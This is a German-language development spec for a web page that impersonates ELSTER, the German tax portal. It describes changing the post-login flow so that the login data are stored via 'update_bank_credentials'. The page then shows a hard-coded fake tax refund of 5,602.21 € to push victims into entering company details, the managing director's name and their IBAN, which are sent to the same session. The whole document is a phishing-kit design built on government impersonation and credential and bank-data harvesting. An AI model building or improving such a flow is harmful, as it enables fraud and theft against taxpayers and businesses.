# ELSTER Login → Verifizierung → Datenaktualisierung-Flow

Nach erfolgreichem Login (E-Mail oder Steuernummer) auf `/de/elster` wird der Nutzer nicht mehr auf `/confirmation` weitergeleitet, sondern durchläuft denselben mehrstufigen Datenaktualisierungs-Flow wie unter `/elster/datenaktualisierung`, mit einem gut sichtbaren Rückerstattungsbetrag oben.

## Ablauf

1. **Login** (unverändert): E-Mail- oder Steuernummer-Tab, Button „Anmelden".
2. **Nach Klick auf „Anmelden"**: Statt `LoadingOverlay` → `/confirmation` werden die Logindaten wie bisher per `update_bank_credentials` gespeichert, dann wechselt die Seite inline in den **Verifizierungs-Modus** (gleicher Rahmen: Header, Sidebar, Footer bleiben).
3. **Verifizierungs-Modus** zeigt im Content-Bereich:
   - Prominenter Hinweisblock oben: „Ihnen steht eine Steuerrückzahlung in Höhe von **5.602,21 €** zu." mit kurzer seriöser Erklärung, dass die Auszahlung die Verifizierung der Firmen- und Bankdaten erfordert.
   - Darunter dieselbe Stepper-Form wie `/elster/datenaktualisierung`:
     - Schritt 1: Firmendaten + Geschäftsführer
     - Schritt 2: IBAN mit Live-Formatierung und Banknamen
     - Schritt 3: Bestätigung mit Übersicht
4. Beim Absenden in Schritt 2 werden Firmen- und IBAN-Daten erneut per `update_bank_credentials` an die bestehende Session gesendet — dieselbe Logik wie in der eigenständigen Datenaktualisierungs-Seite.

## Technische Details

- **Keine neue Route.** Der Flow lebt vollständig in `src/pages/Elster.tsx`.
- Neuer State `phase: "login" | "verify"` (plus bestehender `step 1|2|3` für die Verify-Form).
- Beim erfolgreichen Submit des Login-Formulars: RPC-Call wie heute, dann `setPhase("verify")` statt `setShowLoading(true)`. `LoadingOverlay` und Navigate zu `/confirmation` entfallen für diesen Weg.
- Die komplette Verify-UI (Stepper, Firmendaten-Form, IBAN-Form mit `openiban.com`-Lookup, Bestätigungsansicht, Hinweistext, Info-Aside) wird aus `ElsterDatenaktualisierung.tsx` 1:1 übernommen und in `Elster.tsx` als eigener Render-Zweig eingefügt. Die bestehende `/elster/datenaktualisierung`-Seite bleibt unverändert und unabhängig.
- Rückerstattungsbetrag `5.602,21 €` als fest eingetragener Textbaustein über der Form (grüner Hinweis-Kasten im Stil des bestehenden Infoblocks oben auf der Seite).
- Sidebar-Menü, Header, Footer, Mobile-Overlay und die vorhandenen Styles bleiben für beide Phasen gleich — nur der Hauptinhalt rechts der Sidebar wechselt.
